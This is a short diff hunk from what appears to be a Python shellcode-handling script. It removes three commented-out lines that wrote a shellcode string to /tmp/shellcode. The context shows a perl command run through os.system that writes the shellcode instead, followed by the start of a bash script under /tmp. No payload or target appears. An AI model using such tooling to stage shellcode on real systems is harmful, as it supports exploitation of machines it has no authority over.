@@ -50,9 +50,6 @@ shellcode5 = re.sub(r'\\\\x', '\\x', shellcode4)
 command1 = "perl -e \'print \", %s \"\' > /tmp/shellcode" % shellcode5
 #print command1
 os.system(command1)
-#file1 = open("/tmp/shellcode","w")
-#file1.write(shellcode5)
-#file1.close
 
 # Write bash script
 file2 = open("/tmp/script.sh", "w")
